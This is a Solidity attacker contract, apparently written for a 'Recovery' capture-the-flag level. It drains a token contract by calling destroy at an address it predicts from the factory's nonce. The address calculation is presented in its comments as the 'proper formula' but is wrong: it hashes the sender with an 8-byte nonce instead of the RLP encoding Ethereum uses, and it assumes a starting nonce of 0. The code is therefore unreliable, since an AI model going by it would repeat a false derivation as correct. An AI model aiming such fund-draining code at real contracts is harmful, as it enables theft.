pragma solidity ^0.8.0;

interface Recovery {
    function generateToken(string memory _name, uint256 _initialSupply) external;
}


interface SimpleToken {
    function destroy(address payable _to) external;
}


contract CorrectedAttacker {
    address immutable instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function attack() external {
        // 1. Generate a new SimpleToken
        Recovery(instance).generateToken("", 1 wei);

        // 2. Calculate its address using sender (Recovery) and nonce (1 now)
        address tokenAddress = calculateTokenAddress(instance, 1);

        // 3. Call destroy to recover funds from the first SimpleToken
        SimpleToken(calculateTokenAddress(instance, 0)).destroy(payable(msg.sender));
    }

    function calculateTokenAddress(address sender, uint256 nonce) public pure returns (address) {
        // Proper formula: hash sender address and 8-byte nonce (for contract creators)
        bytes20 senderBytes = bytes20(sender);
        bytes8 nonceBytes = bytes8(uint64(nonce)); // Explicit conversion
        bytes32 combinedHash = keccak256(abi.encodePacked(senderBytes, nonceBytes));

        // Convert the resulting hash to address correctly by truncating to 20 least significant bytes
        return address(uint160(uint256(combinedHash)));
    }
}